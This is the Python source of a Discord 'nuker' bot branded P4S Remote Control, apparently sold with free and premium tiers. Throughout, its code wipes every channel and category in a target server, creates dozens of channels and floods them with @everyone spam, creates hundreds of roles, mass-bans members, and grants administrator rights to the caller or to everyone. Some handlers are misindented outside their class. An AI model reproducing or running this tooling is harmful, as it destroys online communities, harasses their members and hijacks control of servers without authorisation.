import discord
from discord.ext import commands
import asyncio
import random
import time
from datetime import datetime


bot = commands.Bot(command_prefix=".", intents=discord.Intents.all(), help_command=None)

token = ""
server_main = 1
prem_role = 1
block_server = 1
user_cooldowns = {}
premium_configs = {}


def whitelist_user(user):
    guild = bot.get_guild(server_main)
    return guild and guild.get_member(user.id) is not None

def is_premium_user(member):
    guild = bot.get_guild(server_main)
    if guild and guild.get_member(member.id):
        return any(role.id == prem_role for role in guild.get_member(member.id).roles)
    return False


@bot.command(name="help")
async def help_cmd(ctx, *, arg=None):
    if ctx.guild is not None:
        return

    embed = discord.Embed(
        title="P4S REMOTE CONTROL",
        description="Complete command list and usage guide (all commands used in DM)",
        color=0x2b2d31
    )

    embed.add_field(
        name="CONTROL COMMAND",
        value=(
            "```\n"
            ".control [server_id]\n"
            "```\n"
            "Open the control panel for a server where the bot is present"
        ),
        inline=False
    )

    embed.add_field(
        name="FREE MODE ATTACKS",
        value=(
            "```\n"
            "KILL      – Full server destruction\n"
            "NUKE      – Delete all channels\n"
            "ROLES     – Delete and create roles\n"
            "BAN ALL   – Mass ban members\n"
            "ADMIN     – Gives you admin\n"
            "ADMIN ALL – Give admin to everyone\n"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="PREMIUM MODE ATTACKS",
        value=(
            "```\n"
            "PREMIUM KILL     – Custom attack with your config\n"
            "PREMIUM ROLES    – Create custom named roles\n"
            "PREMIUM MASSBAN  – Faster massban\n"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="OTHER COMMANDS",
        value=(
            "```\n"
            ".config – Configure premium settings\n"
            ".ping   – Check bot latency\n"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="REQUIREMENTS",
        value=(
            "You must be in Ph4se to use this bot\n"
            "Join here: https://discord.gg/ph4se"
        ),
        inline=False
    )

    embed.set_footer(text="P4S Remote Control System")

    await ctx.send(embed=embed)


@bot.command()
async def ping(ctx):
    guild = ctx.guild
    user = ctx.author
    if ctx.guild is not None:
        return

    if guild.id == block_server:
        return

    if not whitelist_user(user):
        await ctx.send(f"You need to be on discord.gg/kxi to use this bot")
        return
    
    latency = round(bot.latency * 1000)
    embed = discord.Embed(
        title="PONG",
        color=0x57F287  
    )
    embed.description = f"````{latency}ms````"
    embed.set_footer(text="P4S Remote Control System")
    await ctx.send(embed=embed)

def base_embed(guild: discord.Guild):
    return discord.Embed(
        title="P4S CONTROL PANEL",
        description=(
            f"```yaml\n"
            f"Server: {guild.name}\n"
            f"Members: {guild.member_count}\n"
            f"Owner: {guild.owner}\n"
            f"```\n"
            f"Select your attack mode from the menu below\n\n"
            f"**Access Level**\n"
            f"Free Access\n"
            f"P4S Remote Control System"
        ),
        color=0x2b2d31
    )


def free_embed(guild: discord.Guild):
    return discord.Embed(
        title="P4S CONTROL PANEL",
        description=(
            f"```yaml\n"
            f"Server: {guild.name}\n"
            f"Members: {guild.member_count}\n"
            f"Owner: {guild.owner}\n"
            f"```\n"
            f"**Mode selected: FREE**\n\n"
            f"❗ To see the usage of each button, type `.help` in this same dm.\n\n"
            f"P4S Remote Control System"
        ),
        color=0x2b2d31
    )


def premium_embed(guild: discord.Guild):
    return discord.Embed(
        title="P4S CONTROL PANEL",
        description=(
            f"```yaml\n"
            f"Server: {guild.name}\n"
            f"Members: {guild.member_count}\n"
            f"Owner: {guild.owner}\n"
            f"```\n"
            f"**Mode selected: PREMIUM**\n\n"
            f"❗ To see the usage of each button, type `.help` in this same dm.\n\n"
            f"P4S Remote Control System"
        ),
        color=0x2b2d31
    )




class FreeView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=500)
        self.guild = guild

    @discord.ui.button(label="KILL", style=discord.ButtonStyle.danger)
    async def kill(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        now = time.time()

        if user_id in user_cooldowns and now - user_cooldowns[user_id] < 290:
            remaining = int(290 - (now - user_cooldowns[user_id]))
            await interaction.response.send_message(
                f"Cooldown active. Try again in `{remaining}s`",
                ephemeral=True
            )
            return

        user_cooldowns[user_id] = now

        await interaction.response.send_message(
            "executing kill.",
            ephemeral=True
        )
        await execute_kill(self.guild)
        await interaction.followup.send(
            "but when iii",
            ephemeral=True
        )

    @discord.ui.button(label="NUKE", style=discord.ButtonStyle.danger)
    async def nuke(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        now = time.time()

        if user_id in user_cooldowns and now - user_cooldowns[user_id] < 290:
            remaining = int(290 - (now - user_cooldowns[user_id]))
            await interaction.response.send_message(
                f"Cooldown active. Try again in `{remaining}s`",
                ephemeral=True
            )
            return

        user_cooldowns[user_id] = now

        await interaction.response.send_message(
            "executing nuke.",
            ephemeral=True
        )
        await execute_nuke(self.guild)
        await interaction.followup.send(
            "but when iii",
            ephemeral=True
        )

    @discord.ui.button(label="ROLES", style=discord.ButtonStyle.danger)
    async def roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "executing roles.",
            ephemeral=True
        )
        await execute_roles(self.guild)
        await interaction.followup.send(
            "but when iii",
            ephemeral=True
        )

    @discord.ui.button(label="BAN ALL", style=discord.ButtonStyle.danger)
    async def ban_all(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "executing ban all.",
            ephemeral=True
        )
        await execute_ban_all(self.guild)
        await interaction.followup.send(
            "but when iii",
            ephemeral=True
        )


@discord.ui.button(label="ADMIN", style=discord.ButtonStyle.danger)
async def admin(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.send_message(
        "executing admin.",
        ephemeral=True
    )
    await execute_admin(self.guild, interaction.user)
    await interaction.followup.send(
        "but when iii",
        ephemeral=True
    )


@discord.ui.button(label="ADMIN ALL", style=discord.ButtonStyle.danger)
async def admin_all(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.send_message(
        "executing admin all.",
        ephemeral=True
    )
    await execute_admin_all(self.guild)
    await interaction.followup.send(
        "but when iii",
        ephemeral=True
    )

    @discord.ui.button(label="BACK", style=discord.ButtonStyle.secondary, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(
            embed=base_embed(self.guild),
            view=ModeSelectView(self.guild)
        )

@discord.ui.button(label="LEAVE", style=discord.ButtonStyle.secondary)
async def leave(self, interaction: discord.Interaction, button: discord.ui.Button):
    await interaction.response.send_message(
        "executing leave.",
        ephemeral=True
    )

    try:
        await interaction.followup.send(
            "but when iii",
            ephemeral=True
        )
    except:
        pass

    try:
        await self.guild.leave()
    except:
        pass


class PremiumView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=500)
        self.guild = guild

    @discord.ui.button(label="PREMIUM KILL", style=discord.ButtonStyle.primary)
    async def pkill(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        user_id = interaction.user.id
        config = premium_configs.get(user_id)
        if not config:
            await interaction.followup.send("use .config first", ephemeral=True)
            return
        guild = self.guild
        async def delete(channel):
            try:
                await channel.delete()
            except:
                pass
        await asyncio.gather(*[delete(c) for c in guild.channels])
        await asyncio.gather(*[delete(cat) for cat in guild.categories])
        names = config["channels"]
        created_channels = await asyncio.gather(*[
            guild.create_text_channel(random.choice(names)) for _ in range(60)
        ])
        embed = discord.Embed(
            title=config["title"],
            description=config["description"],
            color=0x2b2d31,
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="P4S Premium System")
        embed.set_image(url=config["image"])
        async def send_msg(channel):
            try:
                await channel.send(f"@everyone\n{config['spam']}", embed=embed)
            except:
                pass
        text_channels = [c for c in created_channels if isinstance(c, discord.TextChannel)]
        for _ in range(20):
            await asyncio.gather(*[send_msg(c) for c in text_channels])
            await asyncio.sleep(0.2)
        await interaction.followup.send("but when iii", ephemeral=True)

    @discord.ui.button(label="PREMIUM ROLES", style=discord.ButtonStyle.primary)
    async def proles(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(RoleNameModal(self.guild))

    @discord.ui.button(label="PREMIUM MASSBAN", style=discord.ButtonStyle.primary)
    async def pmassban(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for member in self.guild.members:
            if not member.bot:
                try:
                    await self.guild.ban(member, reason="lone")
                except:
                    continue
        await interaction.followup.send("massban complete", ephemeral=True)

    @discord.ui.button(label="BACK", style=discord.ButtonStyle.secondary, row=2)
    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(
            embed=base_embed(self.guild),
            view=ModeSelectView(self.guild)
        )

    @discord.ui.button(label="LEAVE", style=discord.ButtonStyle.secondary, row=2)
    async def leave(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.message.delete()



class ModeSelect(discord.ui.Select):
    def __init__(self, guild):
        self.guild = guild
        options = [
            discord.SelectOption(label="Free Mode", description="Basic attack options", value="free"),
            discord.SelectOption(label="Premium Mode", description="Custom attack options", value="premium")
        ]
        super().__init__(placeholder="Select attack mode", options=options)

    async def callback(self, interaction: discord.Interaction):
        user = interaction.user
        guild = self.guild

        if self.values[0] == "free":
            if guild.id == block_server:
                return

            if not whitelist_user(user):
                await interaction.response.send_message(
                    "You need to be on discord.gg/ph4se to use this bot",
                    ephemeral=True
                )
                return

            await interaction.response.edit_message(
                embed=free_embed(guild),
                view=FreeView(guild)
            )

        else:
            if guild.id == block_server or not is_premium_user(user):
                await interaction.response.send_message(
                    "You don't have premium access, boost discord.gg/ph4se or buy",
                    ephemeral=True
                )
                return

            await interaction.response.edit_message(
                embed=premium_embed(guild),
                view=PremiumView(guild)
            )


class ModeSelectView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=120)
        self.add_item(ModeSelect(guild))

class RoleNameModal(discord.ui.Modal, title="Premium Role names"):
    role_names = discord.ui.TextInput(
        label="Role Names (comma separated)",
        placeholder="lone, khs, top",
        style=discord.TextStyle.paragraph,
        required=True
    )

    def __init__(self, guild):
        super().__init__()
        self.guild = guild

    async def on_submit(self, interaction: discord.Interaction):
        names = [n.strip() for n in self.role_names.value.split(",")]
        for _ in range(200):
            try:
                await self.guild.create_role(name=random.choice(names))
            except:
                continue
        await interaction.response.send_message("but when ii", ephemeral=True)

@bot.command()
async def control(ctx, server_id: int):
    if ctx.guild is not None:
        return

    if server_id == block_server:
        return

    if not whitelist_user(ctx.author):
        await ctx.send("You need to be on discord.gg/ph4se to use this bot")
        return

    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send("Invalid server id.")
        return

    await ctx.send(
        embed=base_embed(guild),
        view=ModeSelectView(guild)
    )



async def execute_kill(guild: discord.Guild):


    channel_names = ["lone", "khs", "on top"]

    async def channel_delete(channel):
        try:
            await channel.delete()
        except:
            pass

    await asyncio.gather(*[
        channel_delete(c) for c in list(guild.channels)
    ])

    async def create_channel():
        try:
            return await guild.create_text_channel(random.choice(channel_names))
        except:
            return None

    created_channels = await asyncio.gather(*[
        create_channel() for _ in range(60)
    ])

    embed = discord.Embed(
        title="they get aura",
        description="but when iii",
        color=0x2b2d31,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="lone")
    embed.set_image(url="https://files.catbox.moe/d7ssu7.png")

    async def send_msg(ch):
        try:
            await ch.send("@everyone\nbut when iii", embed=embed)
        except:
            pass

    text_channels = [
        c for c in created_channels if isinstance(c, discord.TextChannel)
    ]

    for _ in range(20):
        await asyncio.gather(*[
            send_msg(c) for c in text_channels
        ])


async def execute_nuke(guild: discord.Guild):
    async def channel_delete(channel):
        try:
            await channel.delete()
        except:
            pass

    await asyncio.gather(*[
        channel_delete(channel)
        for channel in list(guild.channels)
        if not isinstance(channel, discord.CategoryChannel)
    ])

    await asyncio.gather(*[
        channel_delete(channel)
        for channel in list(guild.channels)
        if isinstance(channel, discord.CategoryChannel)
    ])

    try:
        channel = await guild.create_text_channel("lone-on-top")
    except:
        return

    embed = discord.Embed(
        title="they get aura",
        description="but when iii",
        color=0x2b2d31,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="lone")
    embed.set_image(url="https://files.catbox.moe/d7ssu7.png")

    try:
        await channel.send("@everyone\nlone on top", embed=embed)
    except:
        pass

async def execute_roles(guild: discord.Guild):
    async def create_role():
        try:
            await guild.create_role(name="lone-on-top")
        except:
            pass

    await asyncio.gather(*[
        create_role() for _ in range(250)
    ])

async def execute_ban_all(guild: discord.Guild):
    async def ban_member(member):
        try:
            if member.id == guild.owner_id:
                return
            if member.id == guild.me.id:
                return
            await guild.ban(member, reason="ban all")
        except:
            pass

    await asyncio.gather(*[
        ban_member(member)
        for member in guild.members
    ])

async def execute_admin(guild: discord.Guild, member: discord.Member):
    try:
        role = discord.utils.get(guild.roles, name="999 aura")
        if role is None:
            role = await guild.create_role(
                name="999 aura",
                permissions=discord.Permissions(administrator=True)
            )
        await member.add_roles(role)
    except:
        pass


async def execute_admin_all(guild: discord.Guild):
    try:
        everyone = guild.default_role
        perms = everyone.permissions
        perms.administrator = True
        await everyone.edit(permissions=perms)
    except:
        pass

class ConfigButtons(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=120)
        self.user_id = user_id

    @discord.ui.button(label="CHANGE", style=discord.ButtonStyle.blurple)
    async def change(self, interaction: discord.Interaction, button: discord.ui.Button):
        
        await interaction.response.send_message(
            "Starting configuration again...",
            ephemeral=True
        )

        
        await start_config(interaction.user, interaction.user)

    @discord.ui.button(label="DELETE", style=discord.ButtonStyle.danger)
    async def delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        premium_configs.pop(self.user_id, None)

        embed = discord.Embed(
            title="CONFIGURATION DELETED",
            description="Your premium configuration has been deleted successfully",
            color=0xff0000
        )
        embed.set_footer(text="P4S Premium System")

        await interaction.response.send_message(
            embed=embed,
            ephemeral=True
        )


        await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.command()
async def config(ctx):
    if ctx.guild is not None:
        return

    if not is_premium_user(ctx.author):
        await ctx.send("You don't have premium access, boost discord.gg/ph4se or buy")
        return

    user_id = ctx.author.id  

    if user_id in premium_configs:
        data = premium_configs[user_id]

        embed = discord.Embed(
            title="YOUR CURRENT CONFIGURATION",
            description="This is your saved premium configuration",
            color=0x2b2d31
        )
        embed.add_field(name="Embed Title", value=data["title"], inline=False)
        embed.add_field(name="Embed Description", value=data["description"], inline=False)
        embed.add_field(name="Image URL", value=data["image"], inline=False)
        embed.add_field(name="Spam Message", value=data["spam"], inline=False)
        embed.add_field(name="Channel Names", value=", ".join(data["channels"]), inline=False)
        embed.set_footer(text="P4S Premium System")

        await ctx.send(embed=embed, view=ConfigButtons(user_id))
        return

    await start_config(ctx, ctx.author)



async def start_config(destination, user):
    def step_embed(step, text):
        embed = discord.Embed(
            title="P4S PREMIUM CONFIGURATION",
            description=text,
            color=0x2b2d31
        )
        embed.add_field(name=f"Step {step} of 5", value="\u200b", inline=False)
        embed.set_footer(text="P4S Premium System")
        return embed

    answers = {}

    questions = [
        ("title", "Please send the **embed title** for your custom attack"),
        ("description", "Please send the **embed description** for your custom attack"),
        ("image", "Please send the **image URL** for your embed"),
        ("spam", "Please send the **spam message** text"),
        ("channels", "Please send the **channel names** separated by commas\nExample: `destroyed, p4s-owns, rekt`"),
    ]

    for i, (key, question) in enumerate(questions, start=1):
        await destination.send(embed=step_embed(i, question))

        try:
            msg = await bot.wait_for(
                "message",
                timeout=120,
                check=lambda m: m.author == user and m.channel == destination.channel
            )
        except asyncio.TimeoutError:
            await destination.send("Configuration timed")
            return

        answers[key] = msg.content.strip()

    premium_configs[user.id] = {
        "title": answers["title"],
        "description": answers["description"],
        "image": answers["image"],
        "spam": answers["spam"],
        "channels": [c.strip() for c in answers["channels"].split(",")]
    }

    embed = discord.Embed(
        title="CONFIGURATION COMPLETE",
        description="Your premium configuration has been saved successfully",
        color=0x1f8b4c
    )
    embed.add_field(name="Embed Title", value=answers["title"], inline=False)
    embed.add_field(name="Embed Description", value=answers["description"], inline=False)
    embed.add_field(name="Image URL", value=answers["image"], inline=False)
    embed.add_field(name="Spam Message", value=answers["spam"], inline=False)
    embed.add_field(name="Channel Names", value=", ".join(premium_configs[user.id]["channels"]), inline=False)
    embed.set_footer(text="P4S Premium System")

    await destination.send(embed=embed)



bot.run(token)